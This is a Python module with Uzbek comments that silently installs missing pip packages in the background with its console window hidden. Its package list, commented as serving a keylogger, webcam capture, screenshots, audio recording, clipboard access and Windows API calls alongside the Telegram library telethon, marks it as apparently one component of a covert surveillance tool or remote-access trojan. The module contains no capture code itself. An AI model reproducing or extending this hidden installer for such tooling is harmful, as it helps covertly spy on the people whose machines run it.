# auto_installer.py - v3.0.4 AUTO DEPENDENCY INSTALLER
"""
Yetishmayotgan kutubxonalarni avtomatik aniqlash va o'rnatish.

Xususiyatlari:
- Background'da ishlaydi (bloklamaydi)
- Silent o'rnatish (konsol ko'rsatmaydi)
- Xato bo'lsa davom etadi
- Log yozadi

Ishlatish:
    from auto_installer import ensure_dependencies
    ensure_dependencies()  # main.py boshida
"""

import sys
import subprocess
import threading
import logging
from typing import List, Tuple, Optional

logger = logging.getLogger(__name__)

# ==================== KERAKLI KUTUBXONALAR ====================
# Format: (import_name, pip_name, is_critical)
# is_critical=True: o'rnatilmasa dastur ishlamaydi
# is_critical=False: o'rnatilmasa ham davom etadi

REQUIRED_PACKAGES = [
    # Core - Majburiy
    ("telethon", "telethon", True),
    ("PIL", "pillow", True),
    ("Crypto", "pycryptodome", True),
    
    # Features - Ixtiyoriy
    ("cv2", "opencv-python", False),           # Webcam
    ("pyautogui", "pyautogui", False),         # Screenshot, GUI
    ("psutil", "psutil", False),               # System info
    ("pynput", "pynput", False),               # Keylogger
    ("sounddevice", "sounddevice", False),     # Audio
    ("scipy", "scipy", False),                 # Audio processing
    ("win32api", "pywin32", False),            # Windows API
    ("pyperclip", "pyperclip", False),         # Clipboard
]

# ==================== TEKSHIRISH ====================
def check_package(import_name: str) -> bool:
    """Kutubxona mavjudligini tekshirish"""
    try:
        __import__(import_name)
        return True
    except ImportError:
        return False

def get_missing_packages() -> List[Tuple[str, str, bool]]:
    """Yetishmayotgan kutubxonalarni aniqlash"""
    missing = []
    for import_name, pip_name, is_critical in REQUIRED_PACKAGES:
        if not check_package(import_name):
            missing.append((import_name, pip_name, is_critical))
            logger.debug(f"Yetishmaydi: {import_name} ({pip_name})")
    return missing

# ==================== O'RNATISH ====================
def install_package(pip_name: str, silent: bool = True) -> bool:
    """
    Bitta kutubxonani o'rnatish
    
    Args:
        pip_name: pip dagi nom
        silent: True = konsol yo'q
    
    Returns:
        bool: muvaffaqiyatli yoki yo'q
    """
    try:
        cmd = [sys.executable, "-m", "pip", "install", pip_name, "--quiet"]
        
        if silent:
            creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            result = subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=creationflags,
                timeout=120  # 2 daqiqa
            )
        else:
            result = subprocess.run(cmd, timeout=120)
        
        if result.returncode == 0:
            logger.info(f"[OK] Installed: {pip_name}")
            return True
        else:
            logger.warning(f"[WARN] Not installed: {pip_name}")
            return False
            
    except subprocess.TimeoutExpired:
        logger.error(f"[TIMEOUT] {pip_name}")
        return False
    except Exception as e:
        logger.error(f"[ERROR] Install failed ({pip_name}): {e}")
        return False

def install_missing_packages(packages: List[Tuple[str, str, bool]], silent: bool = True) -> dict:
    """
    Barcha yetishmayotgan kutubxonalarni o'rnatish
    
    Returns:
        dict: {pip_name: success_bool}
    """
    results = {}
    
    for import_name, pip_name, is_critical in packages:
        logger.info(f"[INSTALL] Installing: {pip_name}...")
        success = install_package(pip_name, silent)
        results[pip_name] = success
        
        # Agar critical bo'lsa va o'rnatilmasa - xato
        if is_critical and not success:
            logger.error(f"[CRITICAL] {pip_name} not installed!")
    
    return results

# ==================== BACKGROUND INSTALLER ====================
def _install_in_background(packages: List[Tuple[str, str, bool]]):
    """Background thread'da o'rnatish"""
    try:
        logger.info(f"[BG] Installing {len(packages)} packages...")
        results = install_missing_packages(packages, silent=True)
        
        success_count = sum(1 for v in results.values() if v)
        fail_count = len(results) - success_count
        
        logger.info(f"[OK] Background install done: {success_count} OK, {fail_count} FAIL")
        
    except Exception as e:
        logger.error(f"[ERROR] Background error: {e}")

def ensure_dependencies(blocking: bool = False) -> bool:
    """
    Kerakli kutubxonalarni tekshirish va o'rnatish
    
    Args:
        blocking: True = to'liq o'rnatish tugaguncha kutish
                  False = background'da o'rnatish (default)
    
    Returns:
        bool: Barcha CRITICAL kutubxonalar mavjud yoki yo'q
    
    Ishlatish:
        # main.py boshida:
        from auto_installer import ensure_dependencies
        
        if not ensure_dependencies():
            print("Critical dependencies missing!")
            sys.exit(1)
    """
    try:
        # 1. Yetishmayotganlarni aniqlash
        missing = get_missing_packages()
        
        if not missing:
            logger.debug("[OK] All packages available")
            return True
        
        # 2. Critical va optional ajratish
        critical_missing = [(i, p, c) for i, p, c in missing if c]
        optional_missing = [(i, p, c) for i, p, c in missing if not c]
        
        logger.info(f"[PKG] Missing: {len(critical_missing)} critical, {len(optional_missing)} optional")
        
        # 3. Critical kutubxonalarni darhol o'rnatish (blocking)
        if critical_missing:
            logger.info("[WARN] Installing critical packages...")
            results = install_missing_packages(critical_missing, silent=True)
            
            # Tekshirish
            for import_name, pip_name, _ in critical_missing:
                if not check_package(import_name):
                    logger.error(f"[CRITICAL] Missing: {import_name}")
                    return False
        
        # 4. Optional kutubxonalarni background'da o'rnatish
        if optional_missing:
            if blocking:
                install_missing_packages(optional_missing, silent=True)
            else:
                thread = threading.Thread(
                    target=_install_in_background,
                    args=(optional_missing,),
                    daemon=True
                )
                thread.start()
                logger.info("[BG] Installing optional packages...")
        
        return True
        
    except Exception as e:
        logger.error(f"[ERROR] ensure_dependencies failed: {e}")
        return False

# ==================== CLI MODE ====================
if __name__ == "__main__":
    import argparse
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    parser = argparse.ArgumentParser(description="Auto Dependency Installer")
    parser.add_argument("--check", action="store_true", help="Faqat tekshirish")
    parser.add_argument("--install", action="store_true", help="O'rnatish")
    parser.add_argument("--list", action="store_true", help="Ro'yxat")
    
    args = parser.parse_args()
    
    if args.list:
        print("\n[PKG] Required packages:")
        print("-" * 50)
        for import_name, pip_name, is_critical in REQUIRED_PACKAGES:
            status = "[OK]" if check_package(import_name) else "[X]"
            critical = "[!]" if is_critical else "[-]"
            print(f"{status} {critical} {pip_name:20} (import: {import_name})")
        print("-" * 50)
        
    elif args.check:
        missing = get_missing_packages()
        if missing:
            print(f"\n[X] Missing: {len(missing)}")
            for i, p, c in missing:
                print(f"  • {p}")
        else:
            print("\n[OK] All packages available!")
            
    elif args.install:
        print("\n[PKG] Installing...")
        ensure_dependencies(blocking=True)
        print("[OK] Done!")
        
    else:
        parser.print_help()
